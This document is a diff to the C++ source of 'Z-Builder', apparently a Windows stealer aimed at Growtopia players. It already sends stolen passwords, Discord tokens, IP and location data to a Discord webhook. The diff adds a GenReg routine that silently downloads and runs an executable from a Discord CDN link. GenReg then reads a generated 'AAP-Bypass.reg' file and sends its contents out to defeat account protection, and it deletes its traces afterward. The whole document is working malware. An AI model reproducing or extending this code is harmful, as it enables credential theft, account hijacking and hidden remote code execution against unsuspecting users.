@@ -51,6 +51,7 @@ string GetMAC();
 void GetBrowserCreds();
 void DisableUAC();
 void DisableProtections();
+void GenReg();
 
 std::string hex_to_string(const std::string& in) {
     std::string output;
@@ -177,6 +178,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         string Info = "**MAC address(es): **`" + AllMAC + "`\\n" + "**IP address: **`" + IPInfo + "`\\n" + "**City / Region / Country: **`" + Location + "`\\n" + "**Time stolen: **`" + Time + "`\\n" + "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n" + "**Discord token: **`" + DToken + "`\\n";
         string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Got an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
         SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
+        GenReg();
         CleanUp();
         if (Feature.find(XorStr("[BrowserCreds:(Y)]")) != string::npos)
         {
@@ -246,6 +248,59 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         }
         return 0;
     }
+}
+
+std::string string_to_hex(const std::string& in) {
+    std::stringstream ss;
+
+    ss << std::hex << std::setfill('0');
+    for (size_t i = 0; in.length() > i; ++i) {
+        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
+    }
+
+    return ss.str();
+}
+
+void GenReg()
+{
+    string TempPath = getenv("TEMP");
+    string RegGenPath = TempPath + "\\GenReg.exe";
+    DownloadFile(XorStr("https://cdn.discordapp.com/attachments/755908849738842196/771914222962999327/GenerateReg.exe"), RegGenPath);
+    string cmd = "#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$";
+    //string cmd = "[29540]--[463350482]--[14770,14770c,14770w,14770wc]--[347512861,347512861c]#$#$#$#$";
+    size_t cmdSplitter1 = cmd.find("#");
+    size_t cmdSplitter2 = cmd.find("$");
+    if (cmdSplitter1 < cmdSplitter2)
+    {
+        cmd = cmd.substr(0, cmdSplitter1);
+    }
+    else
+    {
+        cmd = cmd.substr(0, cmdSplitter2);
+    }
+    string Code = XorStr("cmd.exe /c \"") + RegGenPath + XorStr("\" ") + cmd;
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    string RegFilePath = TempPath + XorStr("\\AAP-Bypass.reg");
+    ifstream ReadFile(RegFilePath);
+    string RegString = string((istreambuf_iterator<char>(ReadFile)),
+        (istreambuf_iterator<char>()));
+    ReadFile.close();
+    remove(RegFilePath.c_str());
+    string HexString = decrypt(string_to_hex(RegString));
+    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Registry string! ~Z-Builder**__\",\"description\":\"```" + HexString + "```\",\"color\":\"65535\"}] }";
+    SendMessage(AllInfo, "application/json");
+    remove(RegGenPath.c_str());
 }
 
 void DisableUAC()
@@ -478,6 +533,7 @@ string SaveDatPath()
         RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Growtopia"), 0, KEY_READ, &hKey);
         RegGetValueA(hKey, NULL, "path", RRF_RT_REG_SZ, NULL, (void*)data, &datasize);
         GTLocation = data;
+        RegCloseKey(hKey);
     }
     catch (...)
     {
